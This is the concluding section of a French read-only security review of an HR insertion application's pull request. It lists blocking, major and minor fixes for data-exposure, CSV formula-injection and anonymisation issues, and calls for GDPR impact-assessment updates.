Les suites existantes du chantier restent vertes : `insertion-cadre-contract` + `fse-plus-contract` +
`exports-journalisation-contract` = **95 tests**, `tests/contract/insertion*` = **145 tests**,
`tests/unit/rgpd-audit-libelles` = 2, `npx vite build` (frontend) vert.

**Réserve sur la couverture** : les constats M-02 (écriture de la sortie FSE+ par un MANAGER) et m-01
(SAVEPOINT partagé) ne sont pas reproduits par un test — leur mise en scène demande une base
PostgreSQL réelle, hors du périmètre lecture seule de cette revue. Ils sont établis par lecture de
code et par les lignes citées.

---

## 6. Correctifs à appliquer avant merge — liste ordonnée

**Bloquants (le merge ne doit pas passer sans eux)**

1. **C-01** — `cadre.js:313` : retirer `eligibilite.criteres` de la projection MANAGER (ne garder que
   `verifiee_le`, `source`, `nb_criteres`). Corriger les deux assertions correspondantes de
   `insertion-cadre-contract.test.js` (l. 124 et le test « aucune donnée sensible servie »).
2. **C-02** — `routes.js:326` : `enrichirFse(row, employeeId, baseRole)` ne lit **pas**
   `employees.brsa` / `france_travail_id` pour un MANAGER et renvoie des suggestions vides. Propager
   `baseRole` aux appels `:198` et `:443`.
3. **C-03** — `routes.js:2071` : ne servir l'alerte `referent_non_determine` qu'à ADMIN/RH, et
   reformuler le message sans nommer le statut BRSA.

**Majeurs (à faire dans la même PR, ils touchent des pièces opposables)**

4. **M-01** — `masking.js:22` : ajouter `fse_entree`, `fse_entree_complet`, `fse_entree_saisie_at` à
   `MANAGER_HIDDEN_FIELDS` ; refuser l'écriture des clés FSE+ au MANAGER dans `PUT /diagnostic`.
5. **M-05** — `insertion-fse.js` : ajouter le DO-scan d'élargissement du CHECK `situation_6mois`
   (bloc SQL fourni au § 2). Sans lui, la recette sur un environnement déjà migré produira un 500.
6. **M-04** — `exports-fse.js:76` **et** `exports.js:451` : neutraliser les formules
   (préfixe apostrophe sur `^[=+\-@\t\r]`, chaînes uniquement) ; même traitement pour `addDataSheet`.
7. **M-03** — `anonymization.js` : retirer la clé `commentaire` des deux JSONB FSE+ à l'anonymisation
   (deux `UPDATE … - 'commentaire'` dans le SAVEPOINT existant) **ou** retirer l'item du schéma ;
   mettre le registre art. 30 en accord avec le choix retenu.
8. **M-02** — `routes.js:779` : restreindre la clôture d'un `bilan_sortie` à ADMIN/RH ; masquer ou
   projeter `sortie_fse` (`:1001`) ; retirer `detail: e.message` (`:988`).
9. **M-06** — trancher le sort de `sortant_detention` dans la colonne 10 de l'export, puis aligner
   code, registre art. 30 et note à l'AIPD. **Décision à faire prendre par la direction et le DPO,
   pas par le lot.**

**Mineurs (peuvent partir en PR B si la direction le décide, sauf m-01 et m-02)**

10. **m-01** — un SAVEPOINT par table dans l'anonymisation (une table absente ne doit pas en épargner
    deux autres en silence).
11. **m-02** — doubler la journalisation de consultation d'une pièce par `logActivity`.
12. **m-09** — rétablir la garde de `toCsv` sur un jeu vide.
13. **m-07** — conditionner `<DossierConformite>` à `adminRh`.
14. **m-06** — vérifier que `milestone_id` / `pmsmp_id` appartiennent au salarié au dépôt d'une pièce.
15. **m-03 / m-04 / m-05 / m-08 / m-10** — hygiène : retrait de `detail: err.message`, `nomGenerateur()`
    dans l'en-tête CSV, drapeau `nominatif` du bilan, texte d'aide sur `absence_piece_ref`, refus
    avant lecture dans `composerCadre`.

**Hors code, à porter au dossier de la présentation (lot 8)**

16. Mettre l'**AIPD** à jour des deux nouveaux traitements (dossier administratif, cofinancement FSE+),
    en nommant : les critères d'éligibilité art. 9/10, le stockage des pièces signées en base, la
    conservation FSE+ ≥ 5 ans survivant à l'anonymisation, et le sort du commentaire libre après
    correctif. L'autorité pose l'AIPD validée par le DPO comme l'une des cinq lignes sur lesquelles
    elle n'a « aucune marge d'appréciation » (`09` § 4.3, condition 5).

---

*Revue de sécurité en lecture seule — aucun fichier de code modifié. Les seuls fichiers écrits sont
les quatre suites de `backend/tests/securite-pr-a/` et le présent rapport.*
